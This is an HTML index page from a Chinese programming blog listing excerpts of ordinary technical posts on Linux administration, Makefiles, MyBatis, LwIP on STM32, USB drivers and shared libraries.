<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a80f0b09da0b1d78185dd216369c5ff/" rel="bookmark">
			springboot保存bpmn文件及用户自定义参数的保存与获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		假如有如下一份bpmn文件，其中usertask扩展了多个属性，那么如何对其进行保存和获取呢？
Tall is cheap, show you the code! 1.准备 假定bpmn如下：
实例流程
代码如下：
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;bpmn2:definitions xmlns:bpmn2="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:activiti="http://activiti.org/bpmn" xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI" xmlns:omgdc="http://www.omg.org/spec/DD/20100524/DC" xmlns:omgdi="http://www.omg.org/spec/DD/20100524/DI" xmlns:xsd="http://www.w3.org/2001/XMLSchema" targetNamespace="http://bpmn.io/schema/bpmn"&gt; &lt;bpmn2:process id="p_1367770574455656450" name="jh0305" isExecutable="true"&gt; &lt;bpmn2:documentation&gt;jh0305&lt;/bpmn2:documentation&gt; &lt;bpmn2:startEvent id="Event_1" name="开始"&gt; &lt;bpmn2:outgoing&gt;SequenceFlow_11hdsvi&lt;/bpmn2:outgoing&gt; &lt;/bpmn2:startEvent&gt; &lt;bpmn2:userTask id="UserTask_0ag1sf3" name="用户任务1" activiti:priority="0"&gt; &lt;bpmn2:extensionElements&gt; &lt;activiti:customProperties assigneeType="0" /&gt; &lt;/bpmn2:extensionElements&gt; &lt;/bpmn2:userTask&gt; &lt;bpmn2:sequenceFlow id="SequenceFlow_11hdsvi" sourceRef="Event_1" targetRef="UserTask_0ag1sf3" /&gt; &lt;bpmn2:userTask id="Activity_10ovq4m" name="用户任务_2" activiti:formKey="" activiti:priority="1"&gt; &lt;bpmn2:extensionElements&gt; &lt;activiti:customProperties assigneeType="1"/&gt; &lt;/bpmn2:extensionElements&gt; &lt;/bpmn2:userTask&gt; &lt;bpmn2:endEvent id="Event_0jg7oml" name="结束节点_0"&gt; &lt;bpmn2:incoming&gt;Flow_1hr1bdj&lt;/bpmn2:incoming&gt; &lt;/bpmn2:endEvent&gt; &lt;bpmn2:sequenceFlow id="Flow_116afj0" sourceRef="UserTask_0ag1sf3" targetRef="Activity_10ovq4m" /&gt; &lt;bpmn2:sequenceFlow id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a80f0b09da0b1d78185dd216369c5ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f38e1b4e7eaede7f1cb474945b5055b/" rel="bookmark">
			linux系统讯飞输入法,在Deepin Linux 15.11命令行中安装及卸载讯飞输入法的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你需要在Deepin Linux 15.11操作系统命令行中安装讯飞输入法，建议先运行sudo apt-get update命令，以下为你介绍安装及卸载讯飞输入法的方法，安装的版本为讯飞输入法 for Linux。
先行说明
以下是在Deepin Linux 15.11操作系统命令行中的安装命令，也可使用商店功能来安装，请看可在深度Deepin系统商店中安装讯飞输入法Linux版及讯飞语记一文。
在Deepin Linux 15.11命令行中安装讯飞输入法的方法
运行命令：sudo apt search iFly
正在排序... 完成
全文搜索... 完成
iflyime/lion 0.9.85 amd64
iflyime built using CMake
运行命令：sudo apt install iflyime
在Deepin Linux 15.11命令行中卸载讯飞输入法的方法
运行命令：sudo apt purge iflyime
安装成功后的截图
附：下载iflyime_0.9.85_amd64.deb包自行安装
下载地址：http://packages.deepin.com/，软件包路径是：/deepin/pool/non-free/i/iflyime/：
目前提供有iflyime_0.9.85_amd64.deb软件包下载，你可以自行下载并安装。
TAG：
除非注明，文章均由 Linux系统学习 整理发布，欢迎转载。如有版权争议，请联系删除。
文章评论
留言与评论(共有 0 条评论)
验证码：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6fa215abdfb93f468ddbb995f6b5d4c/" rel="bookmark">
			STM32 移植LwIP  实现网线插拔自动恢复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32 移植LwIP 之后，能正常联网通讯，但是发现2个问题，
1、上电初始化前，未插入网线，之后就无法获取到IP地址（DHCP）
2、正常通讯过程中，拔掉网线，然后插回去，不知道如何复位
先看一下LWIP初始化代码
/** * LwIP initialization function */ int MX_LWIP_Init() {	/* Initilialize the LwIP stack with RTOS */ tcpip_init( NULL, NULL ); /* IP addresses initialization with DHCP (IPv4) */ ipaddr.addr = 0; netmask.addr = 0; gw.addr = 0; printf("netif add\r\n"); /* add the network interface (IPv4/IPv6) with RTOS */ netif_add(&amp;gnetif, &amp;ipaddr, &amp;netmask, &amp;gw, NULL, &amp;ethernetif_init, &amp;tcpip_input); printf("check netif status\r\n"); /* Registers the default network interface */ netif_set_default(&amp;gnetif); if (netif_is_link_up(&amp;gnetif)) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6fa215abdfb93f468ddbb995f6b5d4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb8542ed25b1d27dd174e096b969b656/" rel="bookmark">
			(98)Address already in use报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(98)Address already in use: AH00072: make_sock: could not bind to address [::]:80
(98)Address already in use: AH00072: make_sock: could not bind to address 0.0.0.0:80
说明80端口被用
终端： ps -ef|grep httpd察看占用的进程或者用netstat -lnp|grep 80
找到后kill掉
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0efed54b0fee06e6748529dfa12e8f19/" rel="bookmark">
			怎么查linux服务器fqdn,linux如何查看主机名
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分析如下：
1、查看本机的hostname
#hostname
在Linux中和hostname相关的有几个:
1. 系统中有HOSTNAME环境变量, 用命令echo $HOSTNAME会把hostname (主机名)显示出来
2. 还有一个hostname命令: 它有几个功能：
a) 查询主机名:
i. hostname //显示主机名短格式，比如localhost;
ii. hostname -f //显示主机名的长格式,带域名，比如：localhost.localdomain
iii. hostname –d //显示域名，比如localdomain iv&gt;. hostname –I //显示主机名对应的IP地址
iv. hostname –a //显示主机别名(alias),和hostname的输出结果一样, 比如localhost
v. hostname –s //显示主机名的短格式，也就是从左边第一逗点前面部分，比如 localhost.localdomain逗点前面就是localhost
b) 设置主机名: 用命令设置的主机名是暂时的，系统重新启动后，设置的主机名就会遗失。
i. hostname newname //设置主机名为newname
3. 永久修改hostname
用hostname修改的hostname是暂时的，如果想永久的修改hostname, 则必须修改相应的配置文件。
扩展资料
语法
hostname [-v] [-a, --alias] [-d, --domain] [-f, --fqdn, --long] [-i, --ip-address] [-s, --short] [-y, --yp, --nis] [-F, --filename] [-h, --help] [-V, --version]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1b513cf44ad5856bd89c10aebd9ea47/" rel="bookmark">
			动态SQL批量增删查改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UserMapper.xml
&lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt; &lt;mapper namespace="com.qianfeng.mapper.UserMapper"&gt; &lt;insert id="addUsers" parameterType="user"&gt; INSERT INTO user (user_name,create_time) values &lt;foreach collection="list" item="user" separator=","&gt; (#{user.userName},#{user.createTime}) &lt;/foreach&gt; &lt;/insert&gt; &lt;insert id="addUsers2" parameterType="user"&gt; INSERT INTO user (user_name,create_time) values &lt;foreach collection="users" item="user" separator=","&gt; (#{user.userName},#{user.createTime}) &lt;/foreach&gt; &lt;/insert&gt; &lt;delete id="deleteUsers"&gt; DELETE FROM user where user_id IN &lt;foreach collection="list" item="userId" open="(" close=")" separator=","&gt; #{userId} &lt;/foreach&gt; &lt;/delete&gt; &lt;select id="selectUsersById" resultType="user"&gt; SELECT *FROM user where user_id IN &lt;foreach collection="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1b513cf44ad5856bd89c10aebd9ea47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44b8da981ce6bc9018865df0d6b99e1c/" rel="bookmark">
			抖音视频中一键提取文案（轻抖）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作用：觉得某段抖音视频中的语音文字有价值，想保存下来，如何做到呢？
1、复制抖音链接。
2、打开微信小程序：”轻抖”。
3、点击”文案提取“。
4、长按输入框，点击”粘贴“。
5、按”一键提取文案“。稍等片刻，提示提取完毕.。
6、按”复制文案“。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2cfa81b7c0302155a091b5cad330d51/" rel="bookmark">
			《干法》稻盛和夫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、要在工作中修行。
2、稻盛和夫认为人生的价值是：是你有没有在工作中磨练你的心性。
3、稻盛和夫认为：工作是万病的良药。因为工作可以起到：
工作可以提升心智，就是磨练心智；（P13：“只有通过长时间不懈的工作，魔力了心智才会具备厚重的人格， 在生活中沉稳而不摇摆”） 、中国古人讲：“君子不重则不威” 4、稻盛和夫把人分为三类：自然醒、可燃型、不燃型。
自燃型：自己又想法，会思考，一天变化着想着如何把一件事情干好。
可燃型：别人激励，鼓励，指导，他就能够好好干，叫做可燃型。
不燃型：怎么鼓励，激励 都没有的人。
5、稻盛和夫做事情有几个原则：
1、不断树立高目标 2、叫做付出不亚于任何人的努力 3、不要有感性的烦恼 4、一定要严酷的锻炼自己 6、动机至善，私心了无。这是稻盛和夫的思考。也是王阳明心学的精髓。动机至善，私心了无，去除自己心中的哪一点私欲，用两只执行合一，在事上磨练。（个人理解：对于我或者及其普通的个体，要结婚生子，买房，小目标是什么时候工资涨个几千快。那么就在一件事上多努力一会，多坚持一会，不要着急，慢慢来）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b1bcc4c0c6923393f11b5314d601786/" rel="bookmark">
			linux上归档文件无法提取,在Deepin 20中归档管理器提示装入归档文件时出现了一个错误的原因...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在升级到Deepin 20系统后，归档管理器(file-roller 3.30.2.1-1+dde)不能打开任何的zip文件，会提示错误信息：装入归档文件时出现了一个错误，如下图所示。以下是原因分析及解决方案。
原因和解决方案
经查，可能是因为unzip(Ubuntu 18.04中安装和使用unzip以在命令行及图形下解压缩zip文件)包升级后，与file-roller出现了不兼容。Deepin仓库里unzip有以下版本：
$ apt policy unzip
unzip:
已安装：6.0.5-23+deb10u2
候选： 6.0.5-23+deb10u2
版本列表：
*** 6.0.5-23+deb10u2 500
500 https://community-packages.deepin.com/deepin apricot/main amd64 Packages
100 /var/lib/dpkg/status
6.0-31deepin 200
200 http://packages.deepin.com/deepin lion/main amd64 Packages
6.0-30+i18n4 200
200 http://packages.deepin.com/deepin panda/main amd64 Packages
最新的6.0.5-23+deb10u2是会导致file-roller报错的，而降级到6.0-31deepin后则恢复正常，执行以下命令安装：
$ sudo apt install unzip=6.0-31deepin
说明
以上两个版本的unzip有何不同呢？看了一下其帮助，似乎6.0.5-23+deb10u2少了几个命令行参数：
-O CHARSET specify a character encoding for DOS, Windows and OS/2 archives(为DOS，Windows和OS/2归档文件指定字符编码)
-I CHARSET specify a character encoding for UNIX and other archives(为UNIX和其他档案指定字符编码)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b1bcc4c0c6923393f11b5314d601786/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3378c7dfb7f25ddde4be479973b7480/" rel="bookmark">
			linux .pc文件make,Makefile之Linux内核模块的Makefile写法分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前些天写一个驱动模块。竟然写内核模块Makefile时出了问题，于是将其总结下来，下次再用时拿过来改下就行了。
#General Purpose Makefile for Linux Kernel module by guoqingbo
KERN_DIR = /home/gqb/development/linux-kernel-2.6.37
#KERN_DIR = /usr/src/$(shell uname -r)
#KERN_DIR = /lib/modules/$(shell uname -r)/build
all:
make -C $(KERN_DIR) M=$(shell pwd) modules
clean:
make -C $(KERN_DIR) M=$(shell pwd) modules clean
rm -rf modules.order
obj-m += xxx.o
第3行KERN_DIR表示内核源码目录，这种方式适用于嵌入式开发的交叉编译，KERN_DIR目录中包含了内核驱动模块所需要的各种头文件及依赖。若在PC机开发内核模块则应使用第4、5行的写法。
第8行中-C表示 指定进入指定的目录即KERN_DIR，是内核源代码目录，调用该目录顶层下的Makefile,目标为modules。
M=$(shell pwd)选项让该Makefile在构造modules目标之前返回到模块源代码目录并在当前目录生成obj-m指定的xxx.o目标模块。
clean这个目标表示将模块清理掉
obj-m += xxx.o即指定当前目录要生成的目标模块，然后modules目标指向obj-m变量中设定的模块
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d984458acd4729f79cf4a8ad38c08fa6/" rel="bookmark">
			linux .pc文件make,实例详解Linux下的Make命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
无论是在linux 还是在Unix环境 中，make都是一个非常重要的编译命令。不管是自己进行项目开发还是安装应用软件，我们都经常要用到make或make install。利用make工具，我们可以将大型的开发项目分解成为多个更易于管理的模块，对于一个包括几百个源文件的应用程序，使用make和 makefile工具就可以简洁明快地理顺各个源文件之间纷繁复杂的相互关系。而且如此多的源文件，如果每次都要键入gcc命令进行编译的话，那对程序员 来说简直就是一场灾难。而make工具则可自动完成编译工作，并且可以只对程序员在上次编译后修改过的部分进行编译。因此，有效的利用make和 makefile工具可以大大提高项目开发的效率。
Make 如何工作的
对于不知道背后机理的人来说，make 命令像命令行参数一样接收目标。这些目标通常存放在以 “Makefile” 来命名的特殊文件中，同时文件也包含与目标相对应的操作。更多信息，阅读关于 Makefiles 如何工作的系列文章。
当 make 命令第一次执行时，它扫描 Makefile 找到目标以及其依赖。如果这些依赖自身也是目标，继续为这些依赖扫描 Makefile 建立其依赖关系，然后编译它们。一旦主依赖编译之后，然后就编译主目标(这是通过 make 命令传入的)。
现在，假设你对某个源文件进行了修改，你再次执行 make 命令，它将只编译与该源文件相关的目标文件，因此，编译完最终的可执行文件节省了大量的时间。
Make 命令实例
下面是本文所使用的测试环境：
OS —— Ubunut 13.04
Shell —— Bash 4.2.45
Application —— GNU Make 3.81
下面是工程的内容：
$ ls
anotherTest.c Makefile test.c test.h
下面是 Makefile 的内容：
all: test
test: test.o anotherTest.o
gcc -Wall test.o anotherTest.o -o test
test.o: test.c
gcc -c -Wall test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d984458acd4729f79cf4a8ad38c08fa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3df4493a5a47baa358b7c3a63eaad1e9/" rel="bookmark">
			linux .pc文件make,简单的驱动makefile详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的驱动makefile详解
一个工程中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，因为 makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。
Linux 2.6 (PC)简单驱动Makefile详解
ifneq ($(KERNELRELEASE),)
module-objs := book.o
obj-m := book.o
else
KERNELDIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)
modules:
$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
endif
clean:
rm -rf *.o *~core.depend.*.cmd *.ko *.mod.c.tmp versions
KERNELRELEASE 内核顶层目录Makefile的一个变量。
KERNELDIR ?= /lib/modules/$(shell uname -r)/build
内核源码树目录。
该Makefile 共读取两次，在输入Makefile时，$(KERNELDIR) 第一次读取KERNELRELEASE并没有被定义，然后就开始读取内核源码的目录，开始定义KERNELRELEASE，然后到当前模块的`目录里面，M=$(PWD) 进入该Makefile时KERNELRELEAS已经被定义了，读取要编译的模块，然后再返回到modules
编译完成，产生.KO文件
Linux 2.6 (ARM)简单驱动Makefile详解
ifneq ($(KERNELRELEASE),)
obj-m := fgpio011.o
else
KDIR := /home/linux-2.6.30/
all:
make -C $(KDIR) M=$(PWD) modules ARCH=arm CROSS_COMPILE=arm-linux-
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3df4493a5a47baa358b7c3a63eaad1e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b99ac4e7e219529db11d4a86a8dc8dc1/" rel="bookmark">
			Linux系统下安装texlive（本文以xubuntu发行版为例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明： 本文仅作安装texlive笔记使用，由于笔者水平有限，如有不当之处，敬请读者指正.
文章目录 1. 下载镜像文件1.1 命令行下载1.2 进入清华大学开源软件镜像网站下载 2. 安装per组件3. 挂载iso文件3.1 进入下载的iso文件所在目录3.2 挂载 4 安装4.1 切入/mnt目录（也就是之前挂载iso的目录）4.2 开始安装texlive 5 配置环境变量6. 卸载iso文件7. 支持中文，需要安装中文包8. 使用更多的字体和软件包9. 安装XeLaTex10. 安装texstudio编辑器11. 打开texstudio 1. 下载镜像文件 有两种办法下载镜像文件
1.1 命令行下载 wget https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/texlive2021-20210325.iso 1.2 进入清华大学开源软件镜像网站下载 网址：清华源
2. 安装per组件 sudo apt-get install perl-tk 3. 挂载iso文件 3.1 进入下载的iso文件所在目录 3.2 挂载 sudo mount -o loop texlive2021-20210325.iso /mnt 4 安装 4.1 切入/mnt目录（也就是之前挂载iso的目录） cd /mnt 4.2 开始安装texlive sudo ./install-tl 有提示的时候输入I后回车即可。
这一步会比较费时，请耐心等待。
安装完成标志
5 配置环境变量 进入.bashrc
vi ~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b99ac4e7e219529db11d4a86a8dc8dc1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9594d4a9ddbf8ea4e9e1b0c819b95eb3/" rel="bookmark">
			linux下usb驱动配置文件,Linux USB驱动框架分析（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		19:dev-&gt;udev = usb_get_dev(interface_to_usbdev(interface));
20:dev-&gt;interface = interface;
在17行，我们对usb_skel中的kref结构体进行初始化，设置这个引用计数器的值，这个值用来说明对模块的引用次数，初始化函数如下：
点击(此处)折叠或打开
/***
* kref_init - initialize object.
* @kref: object in question.
*/
void kref_init(struct kref *kref)
{
atomic_set(&amp;kref-&gt;refcount,1);
smp_mb();
}
这个函数不仅用来初始化kref，而且用原子的方式设置refcount的值为1。所以在出错处理代码中有kref_put，它把kref的计数减1，如果kref计数已经为0，那么kref会被释放，kref的释放会在下面分析。
在初始化了一些资源之后，可以看到第一个关键的函数调用——interface_to_usbdev。他同uo一个usb_interface来得到该接口所在设备的设备描述结构。本来，要得到一个usb_device只要用interface_to_usbdev就够了，但因为要增加对该usb_device的引用计数，我们应该在做一个usb_get_dev的操作，来增加引用计数，并在释放设备时用usb_put_dev来减少引用计数。
其中对interface_to_usbdev(interface)函数的定义如下：
点击(此处)折叠或打开
#define interface_to_usbdev(intf) \
container_of(intf-&gt;dev.parent, struct usb_device, dev)
这个函数是通过将usb接口的引用计数，通过container函数，指向usb_devices结构。对于container_of函数，参见http://blog.csdn.net/yinkaizhong/article/details/4093795
21-55：对我们自定义的usb_skel各个状态跟资源作初始化。这部分工作的任务主要是向usb_skel注册该usb设备的端点。这里可能要补充以下一些关于usb_interface_descriptor的知识，但因为内核源码对该结构体的注释不多，所以只能靠个人猜测。在一个usb_host_interface结构里面有一个usb_interface_descriptor叫做desc的成员，他应该是用于描述该interface的一些属性，其中bNumEndpoints是一个8位(b for byte)的数字，他代表了该接口的端点数。probe然后遍历所有的端点，检查他们的类型跟方向，注册到usb_skel中。
56-58：向系统注册一些以后会用的的信息。首先我们来说明一下usb_set_intfdata()，他向内核注册一个data，这个data的结构可以是任意的，这段程序向内核注册了一个usb_skel结构。就是我们刚刚看到的被初始化的那个。之所以要把他注册，是因为我们定义的usb_skel结构不是全局变量，其他的函数需要使用的时候，可以后用usb_get_intfdata来得到。我们可以再内核源码中找到对它的定义：(/linux/usb.h)
点击(此处)折叠或打开
static inline void usb_set_intfdata(struct usb_interface *intf, void *data)
{
dev_set_drvdata(&amp;intf-&gt;dev, data);
}
这个内联函数又调用了dev_set_drvdata(&amp;intf-&gt;dev, data)
我们接着找这个函数的定义：()
点击(此处)折叠或打开
static inline unsigned int dev_set_drvdata(struct device *dev, void *data)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9594d4a9ddbf8ea4e9e1b0c819b95eb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e19417a8a7a29e42e55a01b30fcd1599/" rel="bookmark">
			linux p是什么文件怎么打开,PFILE 文件扩展名： 它是什么以及如何打开它？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PFILE 疑难解答
典型的 PFILE 开放挑战
缺少 Azure Rights Management
双击你的 PFILE 文件会提示消息 “%%os%% 无法打开 PFILE 文件”。 通常情况下，这意味着 Azure Rights Management 没有安装在 %%os%% 上。 操作系统不知道如何处理你的 PFILE 文件，因此双击加载该文件不起作用。
提示：如果您没有安装 Azure Rights Management，并且知道有其他程序可以打开 PFILE 文件，则可以尝试通过从 “显示应用程序” 下列出的程序中进行选择来打开它。
Azure Rights Management 需要更新
由于不兼容，您的 Azure Rights Management 版本可能无法打开 Rights Management Protected File 文件。 如果您没有正确的 Azure Rights Management 版本(或上面列出的任何其他程序)，则可能需要试看下载其另一个版本或上面列出的其他软件应用程序中的一个。 出现此问题的主要原因是，Rights Management Protected File 文件版本是由更新版本的 Azure Rights Management 创建的，而不是你在电脑上安装的版本。
提示： 您有时可以通过右键单击 PFILE 文件，选择 “属性” 并查看版本信息来获得有关正确程序版本的提示。
最终，打开 PFILE 文件的困难大多是由于安装了错误的 Azure Rights Management 版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e19417a8a7a29e42e55a01b30fcd1599/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28fa7fbe1435db37bf8e5ea1178027d3/" rel="bookmark">
			linux缺失库文件,LINUX编译时缺少头文件，查找依赖库的终极解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在LINUX上编译，经常缺少头文件。如果不知道哪个库，就要上网搜索。有时很快找到，有时找不到。有没有一个彻底的解决办法？有。
安装并更新
apt install apt-file
apt update
报错
src/switch_core.c:54:10: fatal error: sqlite3.h: 没有那个文件或目录
#include
需要什么库
root@freeswitch:/home/quantum6/freeswitch# apt-file search sqlite3.h
aolserver4-nssqlite3: /usr/share/doc/aolserver4-nssqlite3/nssqlite3.html
autoconf-archive: /usr/share/doc/autoconf-archive/html/ax_005flib_005fsqlite3.html
cl-sql: /usr/share/doc/cl-sql/html/sqlite3.html
db5.3-doc: /usr/share/doc/db5.3-doc/api_reference/C/sqlite3.html
db5.3-doc: /usr/share/doc/db5.3-doc/api_reference/CXX/sqlite3.html
emscripten: /usr/share/emscripten/tests/sqlite/sqlite3.h
erlang-p1-sqlite3: /usr/lib/erlang/lib/p1_sqlite3-1.1.5/include/sqlite3.hrl
erlang-sqlite3: /usr/lib/erlang/lib/sqlite3-1.1.4~dfsg0/include/sqlite3.hrl
glusterfs-common: /usr/include/glusterfs/gfdb/gfdb_sqlite3.h
hhvm-dev: /usr/include/hphp/runtime/ext/sqlite3/ext_sqlite3.h
libbotan-2-dev: /usr/include/botan-2/botan/sqlite3.h
libghc-haskelldb-hdbc-sqlite3-doc: /usr/lib/ghc-doc/haddock/haskelldb-hdbc-sqlite3-2.1.2/haskelldb-hdbc-sqlite3.haddock
libghc-hdbc-sqlite3-doc: /usr/lib/ghc-doc/haddock/hdbc-sqlite3-2.3.3.1/HDBC-sqlite3.haddock
libmstoolkit-dev: /usr/include/libmstoolkit/sqlite3.h
libsoci-dev: /usr/include/soci/sqlite3/soci-sqlite3.h
libspatialite-dev: /usr/include/spatialite/sqlite3.h
libsqlcipher-dev: /usr/include/sqlcipher/sqlite3.h
libsqlite3-dev: /usr/include/sqlite3.h
libtsk-dev: /usr/include/tsk/auto/sqlite3.h
libwxsqlite3-3.0-dev: /usr/include/wx-3.0/wx/wxsqlite3.h
lisaac-common: /usr/share/lisaac/lib/unstable/sqlite-binding/sqlite3.h
lua-dbi-sqlite3-dev: /usr/include/lua5.1/lua-dbi-sqlite3.h
lua-sql-sqlite3-dev: /usr/include/lua5.1/lua-sql-sqlite3.h
lua-sql-sqlite3-dev: /usr/include/lua5.2/lua-sql-sqlite3.h
lua-sql-sqlite3-dev: /usr/include/lua5.3/lua-sql-sqlite3.h
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28fa7fbe1435db37bf8e5ea1178027d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c678a426c275b746f40da71cef65050/" rel="bookmark">
			linux删除海量文件,linux快速删除海量文件的rsync方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux服务器运行久了，可能会出现海量的垃圾文件去删除，如果使用rm -rf * 命令，可能CPU占用超高，等待时间过久，其实我们可以使用rsync方法.
1. rsync安装，有些系统默认安装有该命令
Ubuntu系统：sudo apt-get install rsync
Fedora 系统：sudo yum install rsync
2. rsync提供了一些跟删除有关的参数
rsync --help | grep delete
--del an alias for --delete-during
--delete delete extraneous files from destination dirs
--delete-before receiver deletes before transfer， not during
--delete-during receiver deletes during transfer (default)
--delete-delay find deletions during， delete after
--delete-after receiver deletes after transfer， not during
--delete-excluded also delete excluded files from destination dirs
--ignore-errors delete even if there are I/O errors
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c678a426c275b746f40da71cef65050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00a4164fd89c7399b7903b707e738eec/" rel="bookmark">
			linux .so文件u xxx,Linux-（C/C&#43;&#43;）动态链接库生成以及使用（libxxx.so）-Go语言中文社区...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux中so文件为共享库，与windows下dll类似，不过实现要简单。
so可以供多个进程使用，不同进程调用同一个so文件，所使用so文件不同。
so文件源程序不需要main函数，有也不会被执行。
下面通过一个简单例子，来学习.so文件的制作跟使用(前提已经配置好环境)、
主要了解学习用C语言编译一个动态链接库，如何使用这个库
1、通过简单max函数，生成一个libmax.so链接库
/*
* max.c
*
* Created on: 2016年7月24日
* Author: Andy_Cong
*/
/*生成libmax.so链接库*/
/*
* # -shared 为链接库 让编译器知道是要编译一个共享库
* # -fPIC(Position Independent Code) 编译生成代码与位置无关
*/
int max(int a,int b)
{
return a&gt;b?a:b;
}
/*
* gcc -Wall -g -fPIC -c max.c -o max.o
* gcc -shared max.o -o libmax.so
* -g -Wall 供调试使用，不是必须的
*/
编译结果：生成libmax.so
2、使用链接库，需要包含头文件(很正常，我们平时使用C库函数也需要包含相关头文件)
max.h头文件如下/*
* max.h
*
* Created on: 2016年7月24日
	</div>
